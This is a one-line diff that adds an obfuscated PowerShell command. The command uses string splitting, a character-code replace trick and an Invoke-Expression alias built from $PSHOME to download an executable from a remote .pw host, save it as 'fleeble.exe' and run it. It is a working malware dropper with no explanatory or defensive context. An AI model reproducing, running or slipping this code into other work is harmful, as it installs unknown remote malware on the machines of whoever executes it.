@@ -1,0 +1,1 @@
+﻿ (('(New-Object Syste'+'m.N'+'e'+'t.We'+'bClient)'+'.Downloa'+'d'+'Fil'+'e(Rl'+'7'+'h'+'t'+'tp:/'+'/'+'net.ge'+'th'+'ost.'+'pw'+'/win'+'dro'+'.exeRl7,Rl7'+'fle'+'e'+'b'+'le.'+'e'+'xe'+'Rl7);S'+'tar'+'t-P'+'ro'+'c'+'e'+'s'+'s'+' Rl7fleeble.exeR'+'l'+'7')  -CrePLAcE ([Char]82+[Char]108+[Char]55),[Char]39) | . ( $PshOME[4]+$PSHOMe[34]+'X')
